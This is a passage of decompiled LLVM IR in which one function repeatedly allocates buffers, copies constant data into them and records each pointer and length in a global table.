  store i32 %v3_123e4, i32* %r5.global-to-local, align 4
  %v3_123f4 = call i32 @function_12db0(i32 %v3_123e4, i32 ptrtoint (i32* @global_var_13828.351 to i32), i32 5)
  store i8 5, i8* bitcast (i32* @global_var_1c280.352 to i8*), align 4
  %v0_12404 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12404, i32* @global_var_1c27c.353, align 4
  %v0_12408 = load i32, i32* %r6.global-to-local, align 4
  %v1_12408 = trunc i32 %v0_12408 to i8
  store i8 %v1_12408, i8* bitcast (i32* @global_var_1c281.354 to i8*), align 4
  %v1_1240c = call i32* @malloc(i32 4)
  %v3_1240c = ptrtoint i32* %v1_1240c to i32
  store i32 %v3_1240c, i32* %r5.global-to-local, align 4
  %v3_1241c = call i32 @function_12db0(i32 %v3_1240c, i32 ptrtoint (i32* @global_var_13830.356 to i32), i32 4)
  store i8 4, i8* bitcast (i32* @global_var_1c288.357 to i8*), align 4
  %v0_1242c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1242c, i32* @global_var_1c284.358, align 4
  %v0_12430 = load i32, i32* %r6.global-to-local, align 4
  %v1_12430 = trunc i32 %v0_12430 to i8
  store i8 %v1_12430, i8* bitcast (i32* @global_var_1c289.359 to i8*), align 4
  %v1_12434 = call i32* @malloc(i32 14)
  %v3_12434 = ptrtoint i32* %v1_12434 to i32
  store i32 %v3_12434, i32* %r5.global-to-local, align 4
  %v3_12444 = call i32 @function_12db0(i32 %v3_12434, i32 ptrtoint (i32* @global_var_13838.361 to i32), i32 14)
  store i8 14, i8* bitcast (i32* @global_var_1c290.362 to i8*), align 4
  %v0_12454 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12454, i32* @global_var_1c28c.363, align 4
  %v0_12458 = load i32, i32* %r6.global-to-local, align 4
  %v1_12458 = trunc i32 %v0_12458 to i8
  store i8 %v1_12458, i8* bitcast (i32* @global_var_1c291.364 to i8*), align 4
  %v1_1245c = call i32* @malloc(i32 6)
  %v3_1245c = ptrtoint i32* %v1_1245c to i32
  store i32 6, i32* %r8.global-to-local, align 4
  store i32 %v3_1245c, i32* %r5.global-to-local, align 4
  %v3_12470 = call i32 @function_12db0(i32 %v3_1245c, i32 ptrtoint (i32* @global_var_13848.366 to i32), i32 6)
  %v0_12478 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12478, i32* @global_var_1c294.367, align 4
  store i8 6, i8* bitcast (i32* @global_var_1c298.368 to i8*), align 4
  %v0_12480 = load i32, i32* %r6.global-to-local, align 4
  %v1_12480 = trunc i32 %v0_12480 to i8
  store i8 %v1_12480, i8* bitcast (i32* @global_var_1c299.369 to i8*), align 4
  %v1_12484 = call i32* @malloc(i32 8)
  %v3_12484 = ptrtoint i32* %v1_12484 to i32
  store i32 8, i32* %sb.global-to-local, align 4
  store i32 %v3_12484, i32* %r5.global-to-local, align 4
  %v3_12498 = call i32 @function_12db0(i32 %v3_12484, i32 ptrtoint (i32* @global_var_13850.371 to i32), i32 8)
  %v0_1249c = load i32, i32* %r7.global-to-local, align 4
  %v0_124a0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_124a0, i32* @global_var_1c29c.372, align 4
  store i8 8, i8* bitcast (i32* @global_var_1c2a0.373 to i8*), align 4
  %v0_124a8 = load i32, i32* %r6.global-to-local, align 4
  %v1_124a8 = trunc i32 %v0_124a8 to i8
  store i8 %v1_124a8, i8* bitcast (i32* @global_var_1c2a1.374 to i8*), align 4
  %v1_124ac = call i32* @malloc(i32 %v0_1249c)
  %v3_124ac = ptrtoint i32* %v1_124ac to i32
  %v0_124b0 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v3_124ac, i32* %r5.global-to-local, align 4
  %v3_124bc = call i32 @function_12db0(i32 %v3_124ac, i32 ptrtoint (i32* @global_var_1385c.376 to i32), i32 %v0_124b0)
  %v0_124c4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_124c4, i32* @global_var_1c2a4.377, align 4
  %v0_124c8 = load i32, i32* %r7.global-to-local, align 4
  %v1_124c8 = trunc i32 %v0_124c8 to i8
  store i8 %v1_124c8, i8* bitcast (i32* @global_var_1c2a8.378 to i8*), align 4
  %v0_124cc = load i32, i32* %r6.global-to-local, align 4
  %v1_124cc = trunc i32 %v0_124cc to i8
  store i8 %v1_124cc, i8* bitcast (i32* @global_var_1c2a9.379 to i8*), align 4
  %v1_124d0 = call i32* @malloc(i32 16)
  %v3_124d0 = ptrtoint i32* %v1_124d0 to i32
  store i32 %v3_124d0, i32* %r5.global-to-local, align 4
  %v3_124e0 = call i32 @function_12db0(i32 %v3_124d0, i32 ptrtoint (i32* @global_var_13864.381 to i32), i32 16)
  store i8 16, i8* bitcast (i32* @global_var_1c2b0.382 to i8*), align 4
  %v0_124f0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_124f0, i32* @global_var_1c2ac.383, align 4
  %v0_124f4 = load i32, i32* %r6.global-to-local, align 4
  %v1_124f4 = trunc i32 %v0_124f4 to i8
  store i8 %v1_124f4, i8* bitcast (i32* @global_var_1c2b1.384 to i8*), align 4
  %v1_124f8 = call i32* @malloc(i32 14)
  %v3_124f8 = ptrtoint i32* %v1_124f8 to i32
  store i32 %v3_124f8, i32* %r5.global-to-local, align 4
  %v3_12508 = call i32 @function_12db0(i32 %v3_124f8, i32 ptrtoint (i32* @global_var_13878.386 to i32), i32 14)
  store i8 14, i8* bitcast (i32* @global_var_1c2b8.387 to i8*), align 4
  %v0_12518 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12518, i32* @global_var_1c2b4.388, align 4
  %v0_1251c = load i32, i32* %r6.global-to-local, align 4
  %v1_1251c = trunc i32 %v0_1251c to i8
  store i8 %v1_1251c, i8* bitcast (i32* @global_var_1c2b9.389 to i8*), align 4
  %v1_12520 = call i32* @malloc(i32 9)
  %v3_12520 = ptrtoint i32* %v1_12520 to i32
  store i32 9, i32* %fp.global-to-local, align 4
  store i32 %v3_12520, i32* %r5.global-to-local, align 4
  %v3_12534 = call i32 @function_12db0(i32 %v3_12520, i32 ptrtoint (i32* @global_var_13888.391 to i32), i32 9)
  %v0_1253c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1253c, i32* @global_var_1c2bc.392, align 4
  store i8 9, i8* bitcast (i32* @global_var_1c2c0.393 to i8*), align 4
  %v0_12544 = load i32, i32* %r6.global-to-local, align 4
  %v1_12544 = trunc i32 %v0_12544 to i8
  store i8 %v1_12544, i8* bitcast (i32* @global_var_1c2c1.394 to i8*), align 4
  %v1_12548 = call i32* @malloc(i32 19)
  %v3_12548 = ptrtoint i32* %v1_12548 to i32
  store i32 %v3_12548, i32* %r5.global-to-local, align 4
  %v3_12558 = call i32 @function_12db0(i32 %v3_12548, i32 ptrtoint (i32* @global_var_13894.396 to i32), i32 19)
  store i8 19, i8* bitcast (i32* @global_var_1c2c8.397 to i8*), align 4
  %v0_12568 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12568, i32* @global_var_1c2c4.398, align 4
  %v0_1256c = load i32, i32* %r6.global-to-local, align 4
  %v1_1256c = trunc i32 %v0_1256c to i8
  store i8 %v1_1256c, i8* bitcast (i32* @global_var_1c2c9.399 to i8*), align 4
  %v1_12570 = call i32* @malloc(i32 23)
  %v3_12570 = ptrtoint i32* %v1_12570 to i32
  store i32 23, i32* %sl.global-to-local, align 4
  store i32 %v3_12570, i32* %r5.global-to-local, align 4
  %v3_12584 = call i32 @function_12db0(i32 %v3_12570, i32 ptrtoint (i32* @global_var_138a8.401 to i32), i32 23)
  %v0_12588 = load i32, i32* %sb.global-to-local, align 4
  %v0_1258c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1258c, i32* @global_var_1c2cc.402, align 4
  store i8 23, i8* bitcast (i32* @global_var_1c2d0.403 to i8*), align 4
  %v0_12594 = load i32, i32* %r6.global-to-local, align 4
  %v1_12594 = trunc i32 %v0_12594 to i8
  store i8 %v1_12594, i8* bitcast (i32* @global_var_1c2d1.404 to i8*), align 4
  %v1_12598 = call i32* @malloc(i32 %v0_12588)
  %v3_12598 = ptrtoint i32* %v1_12598 to i32
  %v0_125a0 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v3_12598, i32* %r5.global-to-local, align 4
  %v4_125a8 = call i32 @function_12db0(i32 %v3_12598, i32 ptrtoint ([9 x i8]* @global_var_138c0.406 to i32), i32 %v0_125a0)
  %v0_125b0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_125b0, i32* @global_var_1c2d4.407, align 4
  %v1_125b4 = trunc i32 %v0_125a0 to i8
  store i8 %v1_125b4, i8* bitcast (i32* @global_var_1c2d8.408 to i8*), align 4
  %v0_125b8 = load i32, i32* %r6.global-to-local, align 4
  %v1_125b8 = trunc i32 %v0_125b8 to i8
  store i8 %v1_125b8, i8* bitcast (i32* @global_var_1c2d9.409 to i8*), align 4
  %v1_125bc = call i32* @malloc(i32 14)
  %v3_125bc = ptrtoint i32* %v1_125bc to i32
  store i32 %v3_125bc, i32* %r5.global-to-local, align 4
  %v3_125cc = call i32 @function_12db0(i32 %v3_125bc, i32 ptrtoint (i32* @global_var_138cc.411 to i32), i32 14)
  store i8 14, i8* bitcast (i32* @global_var_1c2e0.412 to i8*), align 4
  %v0_125dc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_125dc, i32* @global_var_1c2dc.413, align 4
  %v0_125e0 = load i32, i32* %r6.global-to-local, align 4
  %v1_125e0 = trunc i32 %v0_125e0 to i8
  store i8 %v1_125e0, i8* bitcast (i32* @global_var_1c2e1.414 to i8*), align 4
  %v1_125e4 = call i32* @malloc(i32 19)
  %v3_125e4 = ptrtoint i32* %v1_125e4 to i32
  store i32 %v3_125e4, i32* %r5.global-to-local, align 4
  %v3_125f4 = call i32 @function_12db0(i32 %v3_125e4, i32 ptrtoint (i32* @global_var_138dc.416 to i32), i32 19)
  %v0_125fc = load i32, i32* %sl.global-to-local, align 4
  store i8 19, i8* bitcast (i32* @global_var_1c2e8.417 to i8*), align 4
  %v0_12604 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12604, i32* @global_var_1c2e4.418, align 4
  %v0_12608 = load i32, i32* %r6.global-to-local, align 4
  %v1_12608 = trunc i32 %v0_12608 to i8
  store i8 %v1_12608, i8* bitcast (i32* @global_var_1c2e9.419 to i8*), align 4
  %v1_1260c = call i32* @malloc(i32 %v0_125fc)
  %v3_1260c = ptrtoint i32* %v1_1260c to i32
  %v0_12614 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v3_1260c, i32* %r5.global-to-local, align 4
  %v3_1261c = call i32 @function_12db0(i32 %v3_1260c, i32 ptrtoint (i32* @global_var_138f0.421 to i32), i32 %v0_12614)
  %v0_12624 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12624, i32* @global_var_1c2ec.422, align 4
  %v1_12628 = trunc i32 %v0_12614 to i8
  store i8 %v1_12628, i8* bitcast (i32* @global_var_1c2f0.423 to i8*), align 4
  %v0_1262c = load i32, i32* %r6.global-to-local, align 4
  %v1_1262c = trunc i32 %v0_1262c to i8
  store i8 %v1_1262c, i8* bitcast (i32* @global_var_1c2f1.424 to i8*), align 4
  %v1_12630 = call i32* @malloc(i32 24)
  %v3_12630 = ptrtoint i32* %v1_12630 to i32
  store i32 %v3_12630, i32* %r5.global-to-local, align 4
  %v3_12640 = call i32 @function_12db0(i32 %v3_12630, i32 ptrtoint (i32* @global_var_13908.426 to i32), i32 24)
  store i8 24, i8* bitcast (i32* @global_var_1c2f8.427 to i8*), align 4
  %v0_12650 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12650, i32* @global_var_1c2f4.428, align 4
  %v0_12654 = load i32, i32* %r6.global-to-local, align 4
  %v1_12654 = trunc i32 %v0_12654 to i8
  store i8 %v1_12654, i8* bitcast (i32* @global_var_1c2f9.429 to i8*), align 4
  %v1_12658 = call i32* @malloc(i32 15)
  %v3_12658 = ptrtoint i32* %v1_12658 to i32
  store i32 %v3_12658, i32* %r5.global-to-local, align 4
  %v3_12668 = call i32 @function_12db0(i32 %v3_12658, i32 ptrtoint (i32* @global_var_13924.431 to i32), i32 15)
  %v0_12670 = load i32, i32* %r8.global-to-local, align 4
  store i8 15, i8* bitcast (i32* @global_var_1c300.432 to i8*), align 4
  %v0_12678 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12678, i32* @global_var_1c2fc.433, align 4
  %v0_1267c = load i32, i32* %r6.global-to-local, align 4
  %v1_1267c = trunc i32 %v0_1267c to i8
  store i8 %v1_1267c, i8* bitcast (i32* @global_var_1c301.434 to i8*), align 4
  %v1_12680 = call i32* @malloc(i32 %v0_12670)
  %v3_12680 = ptrtoint i32* %v1_12680 to i32
  %v0_12684 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v3_12680, i32* %r5.global-to-local, align 4
  %v4_12690 = call i32 @function_12db0(i32 %v3_12680, i32 ptrtoint ([7 x i8]* @global_var_13934.436 to i32), i32 %v0_12684)
  %v0_12694 = load i32, i32* %r7.global-to-local, align 4
  %v0_12698 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12698, i32* @global_var_1c304.437, align 4
  %v1_1269c = trunc i32 %v0_12684 to i8
  store i8 %v1_1269c, i8* bitcast (i32* @global_var_1c308.438 to i8*), align 4
  %v0_126a0 = load i32, i32* %r6.global-to-local, align 4
  %v1_126a0 = trunc i32 %v0_126a0 to i8
  store i8 %v1_126a0, i8* bitcast (i32* @global_var_1c309.439 to i8*), align 4
  %v1_126a4 = call i32* @malloc(i32 %v0_12694)
  %v3_126a4 = ptrtoint i32* %v1_126a4 to i32
  %v0_126a8 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v3_126a4, i32* %r5.global-to-local, align 4
  %v4_126b4 = call i32 @function_12db0(i32 %v3_126a4, i32 ptrtoint ([8 x i8]* @global_var_1393c.441 to i32), i32 %v0_126a8)
  %v0_126b8 = load i32, i32* %r7.global-to-local, align 4
  %v0_126bc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_126bc, i32* @global_var_1c30c.442, align 4
  %v1_126c0 = trunc i32 %v0_126b8 to i8
  store i8 %v1_126c0, i8* bitcast (i32* @global_var_1c310.443 to i8*), align 4
  %v0_126c4 = load i32, i32* %r6.global-to-local, align 4
  %v1_126c4 = trunc i32 %v0_126c4 to i8
  store i8 %v1_126c4, i8* bitcast (i32* @global_var_1c311.444 to i8*), align 4
  %v1_126c8 = call i32* @malloc(i32 %v0_126b8)
  %v3_126c8 = ptrtoint i32* %v1_126c8 to i32
  %v0_126cc = load i32, i32* %r7.global-to-local, align 4
  store i32 %v3_126c8, i32* %r5.global-to-local, align 4
  %v4_126d8 = call i32 @function_12db0(i32 %v3_126c8, i32 ptrtoint ([8 x i8]* @global_var_13944.446 to i32), i32 %v0_126cc)
  %v0_126e0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_126e0, i32* @global_var_1c314.447, align 4
  %v0_126e4 = load i32, i32* %r7.global-to-local, align 4
  %v1_126e4 = trunc i32 %v0_126e4 to i8
  store i8 %v1_126e4, i8* bitcast (i32* @global_var_1c318.448 to i8*), align 4
  %v0_126e8 = load i32, i32* %r6.global-to-local, align 4
  %v1_126e8 = trunc i32 %v0_126e8 to i8
  store i8 %v1_126e8, i8* bitcast (i32* @global_var_1c319.449 to i8*), align 4
  %v1_126ec = call i32* @malloc(i32 3)
  %v3_126ec = ptrtoint i32* %v1_126ec to i32
  store i32 %v3_126ec, i32* %r5.global-to-local, align 4
  %v4_126fc = call i32 @function_12db0(i32 %v3_126ec, i32 ptrtoint ([4 x i8]* @global_var_1394c.451 to i32), i32 3)
  %v0_12704 = load i32, i32* %sl.global-to-local, align 4
  store i8 3, i8* bitcast (i32* @global_var_1c320.452 to i8*), align 4
  %v0_1270c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1270c, i32* @global_var_1c31c.453, align 4
  %v0_12710 = load i32, i32* %r6.global-to-local, align 4
  %v1_12710 = trunc i32 %v0_12710 to i8
  store i8 %v1_12710, i8* bitcast (i32* @global_var_1c321.454 to i8*), align 4
  %v1_12714 = call i32* @malloc(i32 %v0_12704)
  %v3_12714 = ptrtoint i32* %v1_12714 to i32
  %v0_1271c = load i32, i32* %sl.global-to-local, align 4
  store i32 %v3_12714, i32* %r5.global-to-local, align 4
  %v3_12724 = call i32 @function_12db0(i32 %v3_12714, i32 ptrtoint (i32* @global_var_13950.456 to i32), i32 %v0_1271c)
  %v0_1272c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1272c, i32* @global_var_1c324.457, align 4
  %v1_12730 = trunc i32 %v0_1271c to i8
  store i8 %v1_12730, i8* bitcast (i32* @global_var_1c328.458 to i8*), align 4
  %v0_12734 = load i32, i32* %r6.global-to-local, align 4
  %v1_12734 = trunc i32 %v0_12734 to i8
  store i8 %v1_12734, i8* bitcast (i32* @global_var_1c329.459 to i8*), align 4
  %v1_12738 = call i32* @malloc(i32 28)
  %v3_12738 = ptrtoint i32* %v1_12738 to i32
  store i32 %v3_12738, i32* %r5.global-to-local, align 4
  %v3_12748 = call i32 @function_12db0(i32 %v3_12738, i32 ptrtoint (i32* @global_var_13968.461 to i32), i32 28)
  %v0_12750 = load i32, i32* %fp.global-to-local, align 4
  store i8 28, i8* bitcast (i32* @global_var_1c330.462 to i8*), align 4
  %v0_12758 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12758, i32* @global_var_1c32c.463, align 4
  %v0_1275c = load i32, i32* %r6.global-to-local, align 4
  %v1_1275c = trunc i32 %v0_1275c to i8
  store i8 %v1_1275c, i8* bitcast (i32* @global_var_1c331.464 to i8*), align 4
  %v1_12760 = call i32* @malloc(i32 %v0_12750)
  %v3_12760 = ptrtoint i32* %v1_12760 to i32
  %v0_12764 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v3_12760, i32* %r5.global-to-local, align 4
  %v4_12770 = call i32 @function_12db0(i32 %v3_12760, i32 ptrtoint ([10 x i8]* @global_var_13988.466 to i32), i32 %v0_12764)
  %v0_12774 = load i32, i32* %sb.global-to-local, align 4
  %v0_12778 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12778, i32* @global_var_1c334.467, align 4
  %v1_1277c = trunc i32 %v0_12764 to i8
  store i8 %v1_1277c, i8* bitcast (i32* @global_var_1c338.468 to i8*), align 4
  %v0_12780 = load i32, i32* %r6.global-to-local, align 4
  %v1_12780 = trunc i32 %v0_12780 to i8
  store i8 %v1_12780, i8* bitcast (i32* @global_var_1c339.469 to i8*), align 4
  %v1_12784 = call i32* @malloc(i32 %v0_12774)
  %v3_12784 = ptrtoint i32* %v1_12784 to i32
  %v0_1278c = load i32, i32* %sb.global-to-local, align 4
  store i32 %v3_12784, i32* %r5.global-to-local, align 4
  %v4_12794 = call i32 @function_12db0(i32 %v3_12784, i32 ptrtoint ([9 x i8]* @global_var_138c0.406 to i32), i32 %v0_1278c)
  %v0_1279c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1279c, i32* @global_var_1c33c.470, align 4
  %v1_127a0 = trunc i32 %v0_1278c to i8
  store i8 %v1_127a0, i8* bitcast (i32* @global_var_1c340.471 to i8*), align 4
  %v0_127a4 = load i32, i32* %r6.global-to-local, align 4
  %v1_127a4 = trunc i32 %v0_127a4 to i8
  store i8 %v1_127a4, i8* bitcast (i32* @global_var_1c341.472 to i8*), align 4
  %v1_127a8 = call i32* @malloc(i32 5)
  %v3_127a8 = ptrtoint i32* %v1_127a8 to i32
  store i32 %v3_127a8, i32* %r5.global-to-local, align 4
  %v4_127b8 = call i32 @function_12db0(i32 %v3_127a8, i32 ptrtoint ([6 x i8]* @global_var_13994.474 to i32), i32 5)
  %v0_127c0 = load i32, i32* %r8.global-to-local, align 4
  store i8 5, i8* bitcast (i32* @global_var_1c348.475 to i8*), align 4
  %v0_127c8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_127c8, i32* @global_var_1c344.476, align 4
  %v0_127cc = load i32, i32* %r6.global-to-local, align 4
  %v1_127cc = trunc i32 %v0_127cc to i8
  store i8 %v1_127cc, i8* bitcast (i32* @global_var_1c349.477 to i8*), align 4
  %v1_127d0 = call i32* @malloc(i32 %v0_127c0)
  %v3_127d0 = ptrtoint i32* %v1_127d0 to i32
  %v0_127d4 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v3_127d0, i32* %r5.global-to-local, align 4
  %v4_127e0 = call i32 @function_12db0(i32 %v3_127d0, i32 ptrtoint ([7 x i8]* @global_var_1399c.479 to i32), i32 %v0_127d4)
  %v0_127e8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_127e8, i32* @global_var_1c34c.480, align 4
  %v1_127ec = trunc i32 %v0_127d4 to i8
  store i8 %v1_127ec, i8* bitcast (i32* @global_var_1c350.481 to i8*), align 4
  %v0_127f0 = load i32, i32* %r6.global-to-local, align 4
  %v1_127f0 = trunc i32 %v0_127f0 to i8
  store i8 %v1_127f0, i8* bitcast (i32* @global_var_1c351.482 to i8*), align 4
  %v1_127f4 = call i32* @malloc(i32 16)
  %v3_127f4 = ptrtoint i32* %v1_127f4 to i32
  store i32 %v3_127f4, i32* %r5.global-to-local, align 4
  %v3_12804 = call i32 @function_12db0(i32 %v3_127f4, i32 ptrtoint (i32* @global_var_139a4.484 to i32), i32 16)
  store i8 16, i8* bitcast (i32* @global_var_1c358.485 to i8*), align 4
  %v0_12814 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12814, i32* @global_var_1c354.486, align 4
  %v0_12818 = load i32, i32* %r6.global-to-local, align 4
  %v1_12818 = trunc i32 %v0_12818 to i8
  store i8 %v1_12818, i8* bitcast (i32* @global_var_1c359.487 to i8*), align 4
  %v1_1281c = call i32* @malloc(i32 21)
  %v3_1281c = ptrtoint i32* %v1_1281c to i32
  store i32 21, i32* %r5.global-to-local, align 4
  store i32 %v3_1281c, i32* %r7.global-to-local, align 4
  %v3_12830 = call i32 @function_12db0(i32 %v3_1281c, i32 ptrtoint (i32* @global_var_139b8.489 to i32), i32 21)
  %v0_12834 = load i32, i32* %r5.global-to-local, align 4
  %v0_12838 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_12838, i32* @global_var_1c35c.490, align 4
  %v1_1283c = trunc i32 %v0_12834 to i8
  store i8 %v1_1283c, i8* bitcast (i32* @global_var_1c360.491 to i8*), align 4
  %v0_12840 = load i32, i32* %r6.global-to-local, align 4
  %v1_12840 = trunc i32 %v0_12840 to i8
  store i8 %v1_12840, i8* bitcast (i32* @global_var_1c361.492 to i8*), align 4
  %v1_12844 = call i32* @malloc(i32 %v0_12834)
  %v3_12844 = ptrtoint i32* %v1_12844 to i32
  %v0_12848 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v3_12844, i32* %r7.global-to-local, align 4
  %v3_12854 = call i32 @function_12db0(i32 %v3_12844, i32 ptrtoint (i32* @global_var_139d0.494 to i32), i32 %v0_12848)
  %v0_1285c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1285c, i32* @global_var_1c364.495, align 4
  %v0_12860 = load i32, i32* %r5.global-to-local, align 4
  %v1_12860 = trunc i32 %v0_12860 to i8
  store i8 %v1_12860, i8* bitcast (i32* @global_var_1c368.496 to i8*), align 4
  %v0_12864 = load i32, i32* %r6.global-to-local, align 4
  %v1_12864 = trunc i32 %v0_12864 to i8
  store i8 %v1_12864, i8* bitcast (i32* @global_var_1c369.497 to i8*), align 4
  %v1_12868 = call i32* @malloc(i32 17)
  %v3_12868 = ptrtoint i32* %v1_12868 to i32
  store i32 %v3_12868, i32* %r5.global-to-local, align 4
  %v3_12878 = call i32 @function_12db0(i32 %v3_12868, i32 ptrtoint (i32* @global_var_139e8.499 to i32), i32 17)
  store i8 17, i8* bitcast (i32* @global_var_1c370.500 to i8*), align 4
  %v0_12888 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12888, i32* @global_var_1c36c.501, align 4
  %v0_1288c = load i32, i32* %r6.global-to-local, align 4
  %v1_1288c = trunc i32 %v0_1288c to i8
  store i8 %v1_1288c, i8* bitcast (i32* @global_var_1c371.502 to i8*), align 4
  %v1_12890 = call i32* @malloc(i32 11)
  %v2_12890 = ptrtoint i32* %v1_12890 to i32
  store i32 %v2_12890, i32* %r5.global-to-local, align 4
  %v0_128a0 = load i32, i32* %r8.global-to-local, align 4
  %v1_128a0 = add i32 %v0_128a0, 5
  store i32 %v1_128a0, i32* %r8.global-to-local, align 4
  %v4_128a4 = call i32 @function_12db0(i32 %v2_12890, i32 ptrtoint ([12 x i8]* @global_var_139fc.504 to i32), i32 11)
  %v0_128a8 = load i32, i32* %sl.global-to-local, align 4
  %v0_128ac = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_128ac, i32* @global_var_1c374.505, align 4
  %v1_128b0 = trunc i32 %v1_128a0 to i8
  store i8 %v1_128b0, i8* bitcast (i32* @global_var_1c378.506 to i8*), align 4
  %v0_128b4 = load i32, i32* %r6.global-to-local, align 4
  %v1_128b4 = trunc i32 %v0_128b4 to i8
  store i8 %v1_128b4, i8* bitcast (i32* @global_var_1c379.507 to i8*), align 4
  %v1_128b8 = call i32* @malloc(i32 %v0_128a8)
  %v3_128b8 = ptrtoint i32* %v1_128b8 to i32
  %v0_128c0 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v3_128b8, i32* %r5.global-to-local, align 4
  %v3_128c8 = call i32 @function_12db0(i32 %v3_128b8, i32 ptrtoint (i32* @global_var_13a08.509 to i32), i32 %v0_128c0)
  %v0_128d0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_128d0, i32* @global_var_1c37c.510, align 4
  %v1_128d4 = trunc i32 %v0_128c0 to i8
  store i8 %v1_128d4, i8* bitcast (i32* @global_var_1c380.511 to i8*), align 4
  %v0_128d8 = load i32, i32* %r6.global-to-local, align 4
  %v1_128d8 = trunc i32 %v0_128d8 to i8
  store i8 %v1_128d8, i8* bitcast (i32* @global_var_1c381.512 to i8*), align 4
  %v1_128dc = call i32* @malloc(i32 83)
  %v3_128dc = ptrtoint i32* %v1_128dc to i32
  store i32 %v3_128dc, i32* %r5.global-to-local, align 4
  %v3_128ec = call i32 @function_12db0(i32 %v3_128dc, i32 ptrtoint (i32* @global_var_13d2c.514 to i32), i32 83)
  store i8 83, i8* bitcast (i32* @global_var_1c388.515 to i8*), align 4
  %v0_128fc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_128fc, i32* @global_var_1c384.516, align 4
  %v0_12900 = load i32, i32* %r6.global-to-local, align 4
  %v1_12900 = trunc i32 %v0_12900 to i8
  store i8 %v1_12900, i8* bitcast (i32* @global_var_1c389.517 to i8*), align 4
  %v1_12904 = call i32* @malloc(i32 32)
  %v3_12904 = ptrtoint i32* %v1_12904 to i32
  store i32 %v3_12904, i32* %r5.global-to-local, align 4
  %v3_12914 = call i32 @function_12db0(i32 %v3_12904, i32 ptrtoint (i32* @global_var_13d80.519 to i32), i32 32)
  store i8 32, i8* bitcast (i32* @global_var_1c390.520 to i8*), align 4
  %v0_12924 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12924, i32* @global_var_1c38c.521, align 4
  %v0_12928 = load i32, i32* %r6.global-to-local, align 4
  %v1_12928 = trunc i32 %v0_12928 to i8
  store i8 %v1_12928, i8* bitcast (i32* @global_var_1c391.522 to i8*), align 4
  %v1_1292c = call i32* @malloc(i32 48)
  %v3_1292c = ptrtoint i32* %v1_1292c to i32
  store i32 %v3_1292c, i32* %r5.global-to-local, align 4
  %v3_1293c = call i32 @function_12db0(i32 %v3_1292c, i32 ptrtoint (i32* @global_var_13a20.524 to i32), i32 48)
  store i8 48, i8* bitcast (i32* @global_var_1c398.525 to i8*), align 4
  %v0_1294c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1294c, i32* @global_var_1c394.526, align 4
  %v0_12950 = load i32, i32* %r6.global-to-local, align 4
  %v1_12950 = trunc i32 %v0_12950 to i8
  store i8 %v1_12950, i8* bitcast (i32* @global_var_1c399.527 to i8*), align 4
  %v1_12954 = call i32* @malloc(i32 12)
  %v3_12954 = ptrtoint i32* %v1_12954 to i32
  store i32 12, i32* %r7.global-to-local, align 4
  store i32 %v3_12954, i32* %r5.global-to-local, align 4
  %v3_12968 = call i32 @function_12db0(i32 %v3_12954, i32 ptrtoint (i32* @global_var_13a54.529 to i32), i32 12)
  %v0_1296c = load i32, i32* %fp.global-to-local, align 4
  %v0_12970 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12970, i32* @global_var_1c39c.530, align 4
  %v0_12974 = load i32, i32* %r7.global-to-local, align 4
  %v1_12974 = trunc i32 %v0_12974 to i8
  store i8 %v1_12974, i8* bitcast (i32* @global_var_1c3a0.531 to i8*), align 4
  %v0_12978 = load i32, i32* %r6.global-to-local, align 4
  %v1_12978 = trunc i32 %v0_12978 to i8
  store i8 %v1_12978, i8* bitcast (i32* @global_var_1c3a1.532 to i8*), align 4
  %v1_1297c = call i32* @malloc(i32 %v0_1296c)
  %v3_1297c = ptrtoint i32* %v1_1297c to i32
  %v0_12980 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v3_1297c, i32* %r5.global-to-local, align 4
  %v3_1298c = call i32 @function_12db0(i32 %v3_1297c, i32 ptrtoint (i32* @global_var_13a64.534 to i32), i32 %v0_12980)
  %v0_12994 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12994, i32* @global_var_1c3a4.535, align 4
  %v1_12998 = trunc i32 %v0_12980 to i8
  store i8 %v1_12998, i8* bitcast (i32* @global_var_1c3a8.536 to i8*), align 4
